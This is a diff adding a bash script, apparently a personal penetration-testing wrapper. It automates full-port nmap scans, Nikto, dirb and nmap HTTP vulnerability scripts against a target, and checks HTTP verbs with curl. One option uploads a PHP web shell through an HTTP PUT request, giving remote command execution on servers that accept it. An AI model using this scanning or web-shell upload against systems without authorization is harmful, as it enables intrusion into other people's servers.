@@ -1,0 +1,141 @@
+#!/bin/bash
+#Nmap Full Vuln Scan
+
+#First part checks to make sure we have a host or any variable given.  If not, help options are displayed
+if [ -z "$1" ]; then
+echo "[*] SMB Nmap NSE Scanner"
+echo "[*] Usage: wsmb <target> [options]"
+echo "options:"
+echo "-h, --help                    Show Brief Help"
+echo "-l                            Search for NSE Vuln Scripts"
+echo "-la                           Search through all NSE Scripts"
+echo "-hv                           Run all HTTP Vuln NSE's against target"
+echo "-s                            Run the Full Powerhouse Suite"
+echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
+echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"
+exit 0
+fi
+
+#store our final octet for final naming into $host
+if [[ $1 == *[/]* ]]; then
+hostl=$(echo $1 | cut -d"." -f4 | cut -d"/" -f2)
+host="sub$hostl"
+else
+host=$(echo $1 | cut -d"." -f4)
+fi
+
+#Here we set up our options and arguments
+for arg; do
+    case $arg in
+        -h) echo "[*] SMB Nmap NSE Scanner"
+            echo "[*] Usage: wsmb <domain name> -options"
+            echo "options:"
+            echo "-h, --help                    show brief help"
+            echo "-l                            Search for NSE Vuln Scripts"
+            echo "-la                           Search through all NSE Scripts"
+            echo "-hv                           Run all HTTP Vuln NSE's against target"
+            echo "-s                            Run the Full Powerhouse Suite"
+            echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
+            echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"                
+            exit 0 ;;
+        -l) echo "[*] Search for NSE Vuln Scripts, Options include http, ftp, afp, smb, smtp, samba, rmi, rdp, and mysql"
+            echo "[!] leave empty for all"
+            read -p "<Which Script?> :`echo $'\n> '`" TYPE;
+	    locate nmap/scripts/$TYPE | cut -d"/" -f6 | grep "vuln" | cut -d"." -f1 
+            echo "[*] End"
+            exit 0;;
+        -la) echo "[*] Search for NSE Scripts - Options include acarsd, address, afp, ajp, amqp, asn, auth, backorifice, bacnet, banner, bitcoin, bjnp, broadcast, cassandra, cccam, citrix, couchdb, creds, cups, cvs, daap, daytime, db2, dhcp, dict, distcc, dns, docker, domcon, domino, dpap, drda, firewalk, ftp, hadoop, http, imap, iax2, ip-geolocation, jdwp, ldap, metasploit, mongodb, netbus, nessus, oracle, pop3, quake, sip, smb, smtp, snmp, socks, ssl, targets, ssh, and xmpp"
+            echo "[!] leave empty for all"
+            read -p "<Which Script?> :`echo $'\n> '`" TYPE;
+	    locate nmap/scripts/$TYPE | cut -d"/" -f6 | cut -d"." -f1 
+            echo "[*] End"
+            exit 0;;
+        -s) if [ ! -d ~/Desktop/$host-enum ]; then
+                 mkdir ~/Desktop/$host-enum
+            fi
+            echo "[*] RUNNING THE POWERHOUSE!"
+            if [ "$1" == "-s" ]; then
+                 echo "[*] Error! Must be used with a target or range."
+                 echo "[*] Ex: wenum 192.168.25.142 -s"
+            else
+                 nmap -p0-65535 -A $1 > ~/Desktop/$host-enum/nmap.txt &
+                 wait
+                 if grep -q '\b139/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
+                      echo "[*] SMB Port 139 Open.  Run wsmb"
+                 fi
+                 if grep -q '\b445/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
+                      echo "[*] SMB Port 445 Open.  Run wsmb"
+                 fi
+                 if grep -q '\b80/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
+                      echo "[*] HTTP Port Open"
+                      read -p "<HTTP Open - Run Nikto?> : y/N: " CONDITION;
+                      if [ "$CONDITION" == "y" ]; then
+                           echo "[*] Running Nikto"
+                           nikto -h $1 > ~/Desktop/$host-enum/nikto.txt &
+                           wait
+                      fi
+                      read -p "<HTTP Open - Run Dirb?> : y/N: " CONDITION;
+                      if [ "$CONDITION" == "y" ]; then
+                           dirb http://$1
+                      fi
+                 fi
+                 if grep -q '\b443/tcp\b' ~/Desktop/$host-enum/nmap.txt
+                 then
+                      echo "[*] HTTPS Port Open"
+                      read -p "<HTTPS Open - Run Nikto?> : y/N: " CONDITION;
+                      if [ "$CONDITION" == "y" ]; then
+                           echo "[*] Running Nikto"
+                           nikto -h https://$1 > ~/Desktop/$host-enum/niktossl.txt &
+                           wait
+                      fi
+                      read -p "<HTTPS Open - Run Dirb?> : y/N: " CONDITION;
+                      if [ "$CONDITION" == "y" ]; then
+                           dirb https://$1
+                      fi
+                 fi
+            fi
+            echo "[*] End"
+            leafpad ~/Desktop/$host-enum/nmap.txt
+            exit 0;;
+        -stryngs) curl -X OPTIONS $1 -v
+            exit 0 ;;
+        -stryngsx) read -p "<Enter file to PUT RCE>: " CONDITION;
+            read -p "<HTTP or HTTPS>: " CONDITIONL;
+            echo "[*] Executing curl -X PUT -d '<?php system($_GET['c']);' $CONDITIONL://$1/$CONDITION"
+            curl -X PUT -d '<?php system($_GET["c"]);' http://$1/$CONDITION           
+            exit 0 ;;
+        -hv) if [ "$1" == "-hv" ]; then
+                 echo "[*] Error! Must be used with a target or range."
+                 echo "[*] Ex: wenum 192.168.25.0/24 -hv"
+                 exit 0
+            fi 
+            if [ ! -d ~/Desktop/$host-enum/NSE ]; then
+                 mkdir ~/Desktop/$host-enum
+                 mkdir ~/Desktop/$host-enum/NSE
+            fi 
+            for a in $(locate nmap/scripts/http | cut -d"/" -f6 | grep "vuln" | cut -d"." -f1 | sort -r ); do
+                 nmap -p80 -script $a $1 --open > ~/Desktop/$host-enum/NSE/$a.txt
+                 wait
+                 echo "[*] Running $a"
+                 if grep -q "VULNERABLE" ~/Desktop/$host-enum/NSE/$a.txt; then
+                      echo "[!!] $1 Seems Vulnerable to $a!"
+                 fi
+            done 
+            echo "[*] Done!  Check ~/Desktop/$host-enum/NSE for Scans"
+            exit 0 ;;
+        -*) echo "[*] SMB Nmap NSE Scanner"
+            echo "[*] Usage: wsmb <domain name> -options"
+            echo "options:"
+            echo "-h, --help                    show brief help"
+            echo "-l                            Search for NSE Vuln Scripts"
+            echo "-la                           Search through all NSE Scripts"
+            echo "-hv                           Run all HTTP Vuln NSE's against target"
+            echo "-s                            Run the Full Powerhouse Suite"
+            echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
+            echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"  
+            exit 0;;
+        *)  dir=$arg ;; #This line is required to pass the target when given.  Gives anything given as an argument without a slash and passes it through to be used for the program.
+    esac
+done
+
+echo "[*] Argument Required"
